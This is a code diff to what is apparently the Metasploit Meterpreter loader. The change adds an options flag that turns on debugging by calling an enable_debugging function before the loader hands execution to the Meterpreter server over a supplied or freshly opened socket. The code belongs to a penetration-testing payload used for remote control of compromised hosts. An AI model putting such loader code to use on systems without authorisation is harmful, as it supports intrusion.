@@ -51,6 +51,7 @@ static struct libs libs[] = {
 };
 
 #define LIBC_IDX 0
+#define LIBSUPPORT_IDX 4
 #define METSRV_IDX  5
 
 #include <pthread.h>
@@ -60,11 +61,13 @@ extern int (*pthread_mutex_unlock_fp)(pthread_mutex_t *mutex);
 
 int dlsocket(void *libc);
 
+#define OPT_DEBUG_ENABLE (1 << 0)
+
 /*
  * Map in libraries, and hand off execution to the meterpreter server
  */
 
-unsigned metsrv_rtld(int fd)
+unsigned metsrv_rtld(int fd, int options)
 {
 	int i;
 	int (*libc_init_common)();
@@ -103,14 +106,28 @@ unsigned metsrv_rtld(int fd)
 		pthread_mutex_lock_fp = lock_sym;
 		pthread_mutex_unlock_fp = unlock_sym;
 	}
-
+	
 	if(fstat(fd, &statbuf) == -1) {
+		options = OPT_DEBUG_ENABLE;
+
 		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
 		fd = dlsocket(libs[LIBC_IDX].handle);
 		if(fd == -1) {
 			TRACE("[ failed to dlsocket() a connection. exit()ing ]\n");
 			exit(-1);
 		}
+	}
+
+	if(options & OPT_DEBUG_ENABLE) {
+		void (*enable_debugging)();
+
+		enable_debugging = dlsym(libs[LIBSUPPORT_IDX].handle, "enable_debugging");
+		if(! enable_debugging) {
+			TRACE("[ failed to find the enable_debugging function, exit()'ing ]\n");
+			exit(-1);
+		}
+
+		enable_debugging();
 	}
 
 	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
@@ -355,7 +372,7 @@ void handle_crashes()
  * it will connect to the metasploit meterpreter server.
  */
 
-void _start(int fd)
+void _start(int fd, int options)
 {
 	alarm(0);			// clear out any pending alarms.
 
@@ -364,5 +381,5 @@ void _start(int fd)
 
 	handle_crashes();		// try to make debugging a little easier.
 
-	metsrv_rtld(fd);		
+	metsrv_rtld(fd, options);		
 }
